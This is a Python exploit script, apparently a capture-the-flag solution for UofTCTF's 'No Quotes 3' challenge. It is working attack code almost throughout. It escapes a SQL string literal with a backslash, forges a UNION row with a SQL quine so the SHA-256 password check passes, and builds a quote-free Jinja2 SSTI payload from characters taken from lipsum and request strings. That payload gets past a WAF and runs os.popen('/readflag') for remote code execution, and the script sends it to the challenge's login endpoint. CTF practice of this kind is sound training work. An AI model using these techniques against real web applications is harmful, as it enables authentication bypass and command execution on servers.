#!/usr/bin/env python3
"""
No Quotes 3 - Complete Working Solution
UofTCTF Challenge

This exploit combines:
1. SQL Injection via backslash escape to break out of SQL string literals
2. SQL Quine using REPLACE + SHA2 to make the password hash verification pass
3. SSTI (Server-Side Template Injection) for RCE
4. Character extraction from Jinja2 built-in objects to avoid quotes and periods

The key insights:
- WAF blocks single quotes ('), double quotes ("), and periods (.)
- Backslash in username escapes the SQL quote, making password content SQL code
- SQL Quine makes SHA256(password) == row[1] by construction
- SSTI payload uses |attr() filter with strings built from extracted characters
- Characters come from lipsum|string and request|string representations
"""

import requests
import hashlib
import re
import html

TARGET = "https://no-quotes-3-069c0da32bc4052a.chals.uoftctf.org"

# Known string representations for character extraction
# These are obtained from the server via SSTI
LIPSUM_STR = '<function generate_lorem_ipsum at 0x784a96babd80>'
REQUEST_STR = "<Request 'http://no-quotes-3-069c0da32bc4052a.chals.uoftctf.org/home' [GET]>"


def get_char_expr(c: str) -> str:
    """Get Jinja2 expression that evaluates to character c"""
    if c in LIPSUM_STR:
        return f"(lipsum|string|list)[{LIPSUM_STR.index(c)}]"
    elif c in REQUEST_STR:
        return f"(request|string|list)[{REQUEST_STR.index(c)}]"
    else:
        raise ValueError(f"Cannot find character '{c}' in available string sources")


def build_string_expr(s: str) -> str:
    """Build Jinja2 expression that evaluates to string s using ~ concatenation"""
    parts = [get_char_expr(c) for c in s]
    return "(" + "~".join(parts) + ")"


def build_quine_payload(ssti_payload: str) -> tuple[str, str]:
    """
    Build SQL injection payload with quine for hash verification bypass.

    Returns:
        tuple of (username, password)
    """
    # Username ends with backslash to escape the SQL quote
    username = ssti_payload + '\\'
    username_hex = username.encode().hex()

    # Password template using SQL quine technique:
    # - ) closes the parenthesis from WHERE username = ('...')
    # - UNION SELECT injects our controlled row
    # - row[0] = username (via hex)
    # - row[1] = SHA2(REPLACE(...)) which equals sha256(password) by quine property
    template = f") UNION SELECT 0x{username_hex}, SHA2(REPLACE(0x$, CHAR(36), LOWER(HEX(0x$))), 256) -- "
    hex_template = template.encode().hex()
    password = template.replace('$', hex_template)

    return username, password


def verify_payload(username: str, password: str) -> bool:
    """Verify the quine property and WAF bypass"""
    # WAF check
    blacklist = ["'", '"', "."]
    for c in blacklist:
        if c in username:
            print(f"[-] WAF blocks {repr(c)} in username")
            return False
        if c in password:
            print(f"[-] WAF blocks {repr(c)} in password")
            return False

    # Quine verification
    # The SQL REPLACE function will produce the same string as password
    template_start = ") UNION SELECT 0x"
    username_hex = username.encode().hex()
    template = f") UNION SELECT 0x{username_hex}, SHA2(REPLACE(0x$, CHAR(36), LOWER(HEX(0x$))), 256) -- "
    hex_template = template.encode().hex()

    expected_mysql_output = template.replace('$', hex_template.lower())
    mysql_sha2 = hashlib.sha256(expected_mysql_output.encode()).hexdigest()
    python_sha256 = hashlib.sha256(password.encode()).hexdigest()

    if mysql_sha2 != python_sha256:
        print(f"[-] Quine verification failed: hashes don't match")
        return False

    return True


def build_rce_payload() -> str:
    """
    Build SSTI payload for RCE without quotes or periods.

    Uses |attr filter and strings extracted from lipsum|string and request|string.

    Equivalent to:
        {{lipsum.__globals__['os'].popen('/readflag').read()}}
    """
    # Build string expressions for attribute names and command
    GLOBALS = build_string_expr("__globals__")
    GETITEM = build_string_expr("__getitem__")
    OS = build_string_expr("os")
    POPEN = build_string_expr("popen")
    READ = build_string_expr("read")
    CMD = build_string_expr("/readflag")

    # Chain: lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('/readflag')|attr('read')()
    payload = (
        "{{((((lipsum|attr(" + GLOBALS + "))"
        "|attr(" + GETITEM + ")(" + OS + "))"
        "|attr(" + POPEN + ")(" + CMD + "))"
        "|attr(" + READ + ")())}}"
    )

    return payload


def exploit() -> str | None:
    """Execute the full exploit chain and return the flag"""
    print("[*] Building RCE payload...")
    ssti_payload = build_rce_payload()
    print(f"[*] SSTI payload length: {len(ssti_payload)} chars")

    print("[*] Building SQL quine payload...")
    username, password = build_quine_payload(ssti_payload)
    print(f"[*] Username length: {len(username)} chars")
    print(f"[*] Password length: {len(password)} chars")

    print("[*] Verifying payload...")
    if not verify_payload(username, password):
        return None
    print("[+] Payload verification passed!")

    print(f"\n[*] Sending exploit to {TARGET}...")
    session = requests.Session()

    resp = session.post(f'{TARGET}/login', data={
        'username': username,
        'password': password
    }, allow_redirects=True, timeout=30)

    print(f"[*] Response URL: {resp.url}")

    if 'home' not in resp.url:
        print("[-] Login failed")
        return None

    print("[+] Login successful!")

    # Parse the response for the flag
    match = re.search(r'<span class="mono">(.*?)</span>', resp.text, re.DOTALL)
    if match:
        result = html.unescape(match.group(1)).rstrip('\\')
        print(f"[*] RCE output: {result}")

        flag_match = re.search(r'uoftctf\{[^}]+\}', result)
        if flag_match:
            return flag_match.group(0)

    return None


if __name__ == "__main__":
    print("=" * 60)
    print("No Quotes 3 - SQL Injection + Quine + SSTI RCE")
    print("=" * 60)
    print()

    flag = exploit()

    if flag:
        print()
        print("=" * 60)
        print(f"FLAG: {flag}")
        print("=" * 60)
    else:
        print("\n[-] Exploit failed")
